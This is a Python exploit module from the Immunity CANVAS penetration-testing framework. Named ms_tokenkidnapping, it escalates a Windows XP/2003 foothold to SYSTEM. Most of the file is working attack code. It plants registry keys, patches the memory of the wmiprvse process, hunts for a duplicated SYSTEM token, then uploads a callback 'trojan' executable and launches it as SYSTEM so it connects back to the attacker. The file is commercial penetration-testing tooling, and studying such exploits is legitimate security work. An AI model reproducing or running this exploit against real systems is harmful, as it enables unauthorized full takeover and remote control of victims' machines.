#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2010
#http://www.immunityinc.com/CANVAS/ for more information

import os
import sys
import random
import socket

#covers both angles
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
import canvasengine
from MOSDEF import mosdef
import canvaserror
from libs.canvasos import canvasos

#Import LocalExploit
from ExploitTypes.localexploit import LocalExploit

NAME="ms_tokenkidnapping"
DESCRIPTION="Get SYSTEM on Win2003/WinXP"

DOCUMENTATION={}
DOCUMENTATION["Notes"]="""
0-day

We obtain a shared handle from the wmiprvse service that has system privileges,
then we use it to create a SYSTEM process. The exploited process/user must have
the same or greater privilege level as wmiprvse (NETWORK SERVICE).

This is a port from Cesar Cerrudo's Churraskito to MOSDEF.

Before becoming ms_tokenkidnapping, this exploit was known as choripan:
http://en.wikipedia.org/wiki/Chorip%C3%A1n
"""


VERSION="1.0"
PROPERTY = {}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2003','XP']
PROPERTY['MSADV']=''


#all sorts of defines come from here
from win32MosdefShellServer import *

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.result=""
        self.name=NAME
        return


    def set_progr(self, msg, percent):
        self.setInfo("choripan - "+msg)
        self.setProgress(percent)
        return
   
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def makecode(self, mosdeffile):
        code = """
//remote
#import "remote", "Advapi32.dll|RegSetValueExA" as "RegSetValueExA"
#import "remote", "Advapi32.dll|RegOpenKeyExA" as "RegOpenKeyExA"
#import "remote", "Advapi32.dll|RegCloseKey" as "RegCloseKey"
#import "remote", "Advapi32.dll|OpenThreadToken" as "OpenThreadToken"
#import "remote", "Advapi32.dll|CreateProcessAsUserA" as "CreateProcessAsUserA"
#import "remote", "Advapi32.dll|DuplicateTokenEx" as "DuplicateTokenEx"
#import "remote", "Advapi32.dll|ImpersonateNamedPipeClient" as "ImpersonateNamedPipeClient"
#import "remote", "Advapi32.dll|GetTokenInformation" as "GetTokenInformation"
#import "remote", "Advapi32.dll|LookupAccountSidA" as "LookupAccountSidA"
#import "remote", "Advapi32.dll|SetThreadToken" as "SetThreadToken"
#import "remote", "Advapi32.dll|RegCreateKeyExA" as "RegCreateKeyExA"
#import "remote", "Advapi32.dll|RegDeleteKeyA" as "RegDeleteKeyA"

#import "remote", "Kernel32.dll|CreateNamedPipeA" as "CreateNamedPipeA"
#import "remote", "Kernel32.dll|SetEvent" as "SetEvent"
#import "remote", "Kernel32.dll|ConnectNamedPipe" as "ConnectNamedPipe"
#import "remote", "Kernel32.dll|CloseHandle" as "CloseHandle"
#import "remote", "Kernel32.dll|CreateEventA" as "CreateEventA"
#import "remote", "Kernel32.dll|CreateThread" as "CreateThread"
#import "remote", "Kernel32.dll|WaitForSingleObject" as "WaitForSingleObject"
#import "remote", "Kernel32.dll|GetEnvironmentVariableA" as "GetEnvironmentVariableA"
#import "remote", "Kernel32.dll|GetCurrentThread" as "GetCurrentThread"
#import "remote", "Kernel32.dll|Sleep" as "Sleep"
#import "remote", "Kernel32.dll|GetLastError" as "GetLastError"
#import "remote", "Kernel32.dll|OpenProcess" as "OpenProcess"
#import "remote", "Kernel32.dll|VirtualProtectEx" as "VirtualProtectEx"
#import "remote", "Kernel32.dll|WriteProcessMemory" as "WriteProcessMemory"
#import "remote", "Kernel32.dll|MultiByteToWideChar" as "MultiByteToWideChar"
#import "remote", "Kernel32.dll|DuplicateHandle" as "DuplicateHandle"
#import "remote", "Kernel32.dll|GetCurrentProcess" as "GetCurrentProcess"
#import "remote", "Kernel32.dll|TerminateThread" as "TerminateThread"
#import "remote", "Kernel32.dll|ExitThread" as "ExitThread"
#import "remote", "Kernel32.dll|WaitForSingleObject" as "WaitForSingleObject"

#import "remote", "Ole32.dll|CoCreateInstance" as "CoCreateInstance"
#import "remote", "Ole32.dll|CoInitialize" as "CoInitialize"
#import "remote", "Ole32.dll|CoUninitialize" as "CoUninitialize"

#import "remote", "Psapi.dll|EnumProcessModules" as "EnumProcessModules"
#import "remote", "Psapi.dll|GetModuleBaseNameA" as "GetModuleBaseNameA"

//local
#import "local", "strlen" as "strlen"
#import "local", "strcpy" as "strcpy"
#import "local", "malloc" as "malloc"
#import "local", "free" as "free"
#import "local", "memset" as "memset"
#import "local", "sendunistring2self" as "sendunistring2self"
#import "local", "senddata2self" as "senddata2self"
#import "local", "sendint" as "sendint"
#import "local", "debug" as "debug"
#import "local", "memcpy" as "memcpy"
#import "local", "strcmp" as "strcmp"
#import "local", "restore_base" as "restore_base"

//constants
#define NULL 0
#define REG_EXPAND_SZ 2
#define ERROR_SUCCESS 0
#define false 0
#define FALSE 0
#define true 1
#define TRUE 1
#define MAX_PATH 512

#define HKEY_USERS         0x80000003
#define HKEY_LOCAL_MACHINE 0x80000002
#define KEY_SET_VALUE 2
#define KEY_ALL_ACCESS 0xF003F
#define KEY_WOW64_64KEY 0x100
#define REG_DWORD 4
#define PIPE_ACCESS_DUPLEX 3
#define PIPE_TYPE_MESSAGE 4
#define PIPE_WAIT 0

#define TOKEN_ALL_ACCESS 0x1ff
#define TOKEN_ALL_ACCESS_P 0xff

#define INFINITE 0xFFFFFFFF

#define PROCESS_ALL_ACCESS 0x1F0FFF
#define PAGE_EXECUTE_READWRITE 0x40
#define DUPLICATE_SAME_ACCESS 0x2
#define MAXIMUM_ALLOWED 0x2000000

#define TokenUser 1
#define TokenImpersonation 2
#define TokenImpersonationLevel 9
#define TokenType 8
#define TokenPrimary 1
#define SecurityImpersonation 2

#define CLSCTX_INPROC_SERVER 0x1
#define CP_UTF8 65001

#define WBEM_FLAG_FORWARD_ONLY 0x20
#define WBEM_FLAG_RETURN_IMMEDIATELY 0x10

struct STARTUPINFO {
  int cb;
  char *lpReserved;
  char *lpDesktop;
  char *lpTitle;
  int dwX;
  int dwY;
  int dwXSize;
  int dwYSize;
  int dwXCountChars;
  int dwYCountChars;
  int dwFillAttribute;
  int dwFlags;
  short int wShowWindow;
  short int cbReserved2;
  int * lpReserved2;
  int hStdInput;
  int hStdOutput;
  int hStdError;
};


struct PTOKEN_USER{
    int Sid;
    int Attributes;
};

struct myGUID{
  int a;
  short b;
  short c;
  unsigned char d[8];
};

int report_error(){
  int gle;
  gle = GetLastError();
  //send value back to canvas
  //to add debug enable this sendint
  //sendint(0);
  //sendint(gle);
}

char *bstr(char *str){
  int a;
  char *out;
  int *b;
  //making the bstr
  a = strlen(str);
  a = a*2+10;
  b = malloc(a);
  out = b;
  //out = out+4;
  a = MultiByteToWideChar(CP_UTF8, 0, str, -1, out, a);
  //len in bstr doesnt count null values
  //b[0] = a-2;
  return out;
}


int IsImpersonationToken (int hToken, char * cType)
{
  int ReturnLength;
  int TokenImpInfo;
  int TokenTypeInfo;

  int tmp;

  if(GetTokenInformation(hToken, TokenType,  &TokenTypeInfo, 4, &ReturnLength)!=0){
    tmp = TokenImpersonation;
    if (TokenTypeInfo==tmp) {
      if(GetTokenInformation(hToken, TokenImpersonationLevel,  &TokenImpInfo, 4, &ReturnLength) != 0){
      tmp = SecurityImpersonation;
      if(TokenImpInfo==tmp){
	if (cType != 0)
        {
          *cType='I';
        }
	return TRUE;
      }
      }
    }
    else { 
      if (cType!=0){
        *cType='P';
      }
      return TRUE; 
    }
  }  
  return FALSE;
}

int GetTokenUser(int hToken, char * UserName)
{
  int dwBufferSize;
  dwBufferSize = 0;
  
  int SidNameUse;
  char DomainName[MAX_PATH];
  int dwUserNameSize;
  int dwDomainNameSize; 
  struct PTOKEN_USER *pTokenUser;

  dwUserNameSize= MAX_PATH;
  dwDomainNameSize = MAX_PATH;

  GetTokenInformation(hToken, TokenUser, NULL,0,&dwBufferSize);
  pTokenUser = malloc(dwBufferSize);
  memset(pTokenUser, 0, dwBufferSize);

  if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwBufferSize)){
    if (LookupAccountSidA(NULL,pTokenUser->Sid,UserName,&dwUserNameSize,DomainName,&dwDomainNameSize,&SidNameUse)!=0){
      return TRUE;
    }
  }
  
  return FALSE;
}

void InvokeWMI(){
  //HRESULT hRes
  int hRes;
  //_bstr_t bstrServer;
  char *bstrServer;
  bstrServer = 0;
  //IWbemLocatorPtr spLocator;
  int *spLocator;
  spLocator = 0;
  //IWbemServicesPtr spServices;
  int *spServices;
  spServices = 0;
  //IWbemClassObjectPtr spObject;
  int *spObject;
  spObject = 0;

  char *c;
  char *d;
  int *fptr;

  struct myGUID wbemguid;
  struct myGUID wbemclsid;

  wbemguid.a = 0xDC12A687;
  wbemguid.b = 0x737f;
  wbemguid.c = 0x11CF;
  c = wbemguid.d;
  c[0] = 0x88;
  c[1] = 0x4D;
  c[2] = 0x0;
  c[3] = 0xAA;
  c[4] = 0x0;
  c[5] = 0x4B;
  c[6] = 0x2E;
  c[7] = 0x24;
  
  wbemclsid.a = 0x4590F811;
  wbemclsid.b = 0x1D3A;
  wbemclsid.c = 0x11D0;
  c = wbemclsid.d;
  c[0] = 0x89;
  c[1] = 0x1F;
  c[2] = 0x0;
  c[3] = 0xAA;
  c[4] = 0x0;
  c[5] = 0x4B;
  c[6] = 0x2E;
  c[7] = 0x24;

  c = bstr("root\\MicrosoftIISv2");

  CoInitialize(NULL);

  // create WBEM locator object
  hRes = CoCreateInstance(&wbemclsid, NULL, CLSCTX_INPROC_SERVER, &wbemguid, &spLocator);
  if (hRes < 0)
  {
    report_error();
    return 0;
  }

  //having (un)fun with vtables and com
  //spLocator->ConnectServer spLocator[3]
  fptr = *spLocator;
  fptr  = fptr+3;
  hRes = fptr(*spLocator, c, NULL, NULL, NULL, 0, NULL, NULL, &spServices);
  if (hRes < 0)
  {
    report_error();
    return 0;
  }
  // create enumerator
  //IEnumWbemClassObject* pEnumerator = NULL;
  int *pEnumerator;
  pEnumerator = NULL;
  c = bstr("WQL");
  d = bstr("SELECT * FROM IIsWebInfo");

  //spServices->ExecQuery spServices[20]
  fptr = *spServices;
  fptr = fptr+20;
  hRes = *fptr(spServices, c, d, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
  if (hRes < 0)
  {
    report_error();
    return 0;
  }
  //release, vtable+8
  fptr = *pEnumerator;
  fptr = fptr+2;
  *fptr(pEnumerator);
  fptr = *spLocator;
  fptr = fptr+2;
  *fptr(spLocator);
  fptr = *spServices;
  fptr = fptr+2;
  *fptr(spServices);
}


int GetWMIProcHandle(){
  char szProcessName[MAX_PATH];
  int hProcess;
  int hMod;
  int cbNeeded;
  int i;

  strcpy(szProcessName, "<unknown>");
  i = 0;
  while(i < 0xffff){
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, i );
    if (hProcess != 0)
    {
      if ( EnumProcessModules( hProcess, &hMod, 4,  &cbNeeded) != 0 )
      {
        GetModuleBaseNameA( hProcess, hMod, szProcessName, MAX_PATH);
        if (strcmp(szProcessName,"wmiprvse.exe")==0){
          //Got WMI pid
          return hProcess;
        }
      }
      CloseHandle(hProcess);
    }
    i = i+4;
  }
  return 0;
}



void PatchProc(int hProc){
  int dwOldProt;
  char *Buff;
  char *Buff2;
  char *lpAddress;

  Buff ="\xc2\x04\x00";
  Buff2="\x6a\x0c\x90";

  VirtualProtectEx(hProc,CloseHandle,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
  WriteProcessMemory(hProc,CloseHandle,Buff,0x3,NULL);
  VirtualProtectEx(hProc,CloseHandle,0x3,dwOldProt,&dwOldProt);

  lpAddress=OpenThreadToken;
  lpAddress = lpAddress+0xb;

  VirtualProtectEx(hProc,lpAddress,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
  WriteProcessMemory(hProc,lpAddress,Buff2,0x3,NULL);
  VirtualProtectEx(hProc,lpAddress,0x3,dwOldProt,&dwOldProt);
}

void RestoreProc(int hProc){
  int dwOldProt;
  char *Buff;
  
  Buff="\xc2\x04\x00";

  VirtualProtectEx(hProc,CloseHandle,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
  WriteProcessMemory(hProc,CloseHandle,Buff,0x3,NULL);
  VirtualProtectEx(hProc,CloseHandle,0x3,dwOldProt,&dwOldProt);
}

int ThreadProc(char *lpParameter){
  int a;
  a = 1;
  //set ebx again
  restore_base();
  while (a<3){
    InvokeWMI();
    Sleep(10000);
    a=a+1;
  }
  ExitThread(0);
}

int SpawnReverseShell(int hToken)
{
  int hToken2;
  int hTokenTmp;
  char pInfo[32];
  int dwRes;
  struct STARTUPINFO sInfo;
  int gle;
  char cType;

  memset(&sInfo, 0, 68);
  memset(pInfo, 0, 16);

  sInfo.cb=68;
  //So we don't have to wait the process
  sInfo.lpDesktop= "WinSta0\\Default";

  hTokenTmp=hToken;

  IsImpersonationToken(hToken, &cType);

  if (cType=='I'){
    SetThreadToken(NULL, hToken);
    OpenThreadToken(GetCurrentThread(),TOKEN_ALL_ACCESS,FALSE,&hTokenTmp);
    SetThreadToken(NULL, NULL);
  }
  else{
    hTokenTmp=hToken;
  }
  DuplicateTokenEx(hTokenTmp,MAXIMUM_ALLOWED,NULL,SecurityImpersonation, TokenPrimary,&hToken2) ;

  char *lpComspec;
  lpComspec = "RUNTHIS";

  dwRes=CreateProcessAsUserA(hToken2,  lpComspec ,NULL, NULL, NULL, FALSE,  NULL, NULL, NULL, &sInfo, &pInfo);

  CloseHandle(hTokenTmp);
  CloseHandle(hToken2);

  return dwRes;

}

int SetRegistryValues()
{
   int hKey;
   int x;
   int result;

   x=0x0;
   result=false;

   if( RegCreateKeyExA(HKEY_USERS,"S-1-5-20_Classes\\AppID\\{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}",NULL,NULL,NULL,KEY_ALL_ACCESS,NULL, &hKey,NULL) == ERROR_SUCCESS )
   {
    if (RegSetValueExA(hKey,"AppIDFlags",NULL,REG_DWORD,&x,4)== ERROR_SUCCESS )
    {
      result=true;
    }
   RegCloseKey(hKey);
   }

   return result;
}

int DelRegistrySubkeys()
{
   int result;
   result=false;

   if( RegDeleteKeyA(HKEY_USERS,"S-1-5-20_Classes\\AppID\\{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}") == ERROR_SUCCESS )
   {
    if( RegDeleteKeyA(HKEY_USERS, "S-1-5-20_Classes\\AppID") == ERROR_SUCCESS )
      {
      result=true;
    }
   }

   return result;
}

int main()
{
  int hToken;
  int hTokenOut;
  char *UserName;
  int lpThreadId;
  int dwPort;
  int hProc;
  int j;
  int a;
  int gcp;

  UserName = malloc(32792);
  if (SetRegistryValues() == 0) {
    return 0;
  }

  lpThreadId = CreateThread(NULL,NULL,ThreadProc,NULL,NULL,NULL);
  Sleep(500);

  hProc=GetWMIProcHandle();

  if (hProc != 0){
    PatchProc(hProc);
    a=1;
    //some kind of timeout, by this, the thread should have finished.
    while (a<100){
      j = 0x4;
      while(j < 0x401) {
        hToken=j;
        gcp=GetCurrentProcess();
        if (DuplicateHandle(hProc,hToken,gcp,&hTokenOut,0,FALSE,DUPLICATE_SAME_ACCESS ) != 0){
          if (IsImpersonationToken(hTokenOut, NULL) != 0){
            if(GetTokenUser(hTokenOut, UserName) != 0){
              //Found token
              if (strcmp(UserName,"SYSTEM")==0){
                DelRegistrySubkeys();
                RestoreProc(hProc);
                WaitForSingleObject(lpThreadId,INFINITE);
                a = SpawnReverseShell(hTokenOut);
                CloseHandle(hProc);
                sendint(a);
                return 0;
              }
            }
          }
          CloseHandle(hTokenOut);
        }
        j = j+4;
      }
      a = a+1;
      Sleep(500);
    }
    CloseHandle(hProc);
  }

  DelRegistrySubkeys();
  RestoreProc(hProc);
  WaitForSingleObject(lpThreadId,INFINITE);
  free(UserName);
  sendint(0);
  return 0;
}


        """
        code = code.replace("RUNTHIS",mosdeffile)
        return code

    def run(self):
        self.setInfo("%s"%(NAME))
        node=self.argsDict["passednodes"][0]

        if "win32api" in node.capabilities:
            shell=node.shell
            
            if not self.callback:
                #usually the engine takes care of this
                self.log("Need a callback for this exploit!")
                return 0
            
            self.node=node
            ret,nodeos=node.shell.GetVersionEx()
            minor=nodeos['Minor Version']
            major=nodeos['Major Version']
            if major != 5:
                self.log('Windows %d.%d not supported, expecting 5.x Win2k3/WinXP'%(major,minor))
                return 0
            self.log('Attacking Windows %d.%d'%(major,minor))
        
            #Upload a new mosdef file.
            t_os        = canvasos('WINDOWS')
            t_os.arch   = 'X86'
            trojan = self.buildmosdeftrojan(self.callback.ip, self.callback.port, t_os)

            if trojan != True:
                self.log('building mosdef trojan failed')
                return 0

            #use pelib to build the universal callback shellcode into a trojan .exe
            fi = 'a%d.exe' % (random.randint(0,1000))
            f = open(fi,'w')
            f.write(self.mosdeftrojan)
            f.close()

            remote_filename_exe='tempfile%d.exe'%random.randint(0,1000)
            try:
                ret=self.node.shell.upload(source=fi,destfilename=remote_filename_exe)
            except canvaserror.NodeCommandError, message:
                self.log("Could not upload files!, changing dir.")

                tempdir=node.shell.GetEnvironmentVariable("TEMP")
                self.log("Chdiring into %s on node %s"%(tempdir, node.getname()))
                chdir_ret=node.shell.chdir(tempdir)
                if chdir_ret!=-1:
                    #success!
                    self.log("Running attack in the tempdir to see if that helps")
                    ret=self.node.shell.upload(source=fi,destfilename=remote_filename_exe)                    
                    self.log("Attack returned: %s"%ret)
                else:
                    self.log("Could not chdir into %s - bailing out"%tempdir)
                    self.setInfo("%s: Could not find writable directory (failed)"%NAME)
                    return 0
            
            os.remove(fi)
            
            vars = {}
            code = self.makecode(remote_filename_exe)

            shell.clearfunctioncache()
            request=shell.compile(code,vars)
            shell.sendrequest(request)

            #return from CreateProcessAsUser
            return_value = shell.readint()
            if return_value == 1:
                self.log('New impersonated process was created')
                self.log("You should see another node appearing now")
                self.ISucceeded()
                self.setInfo("%s - done (success: %s)"%(NAME,self.result))
            else:
                self.log("Error: 0x%X" % (return_value) )
                return_value = 0
            shell.leave()
        else:
            self.log("Node not supported")
            return 0
        return return_value

if __name__=="__main__":
    print "This is an exploit that should be used only from within CANVAS"
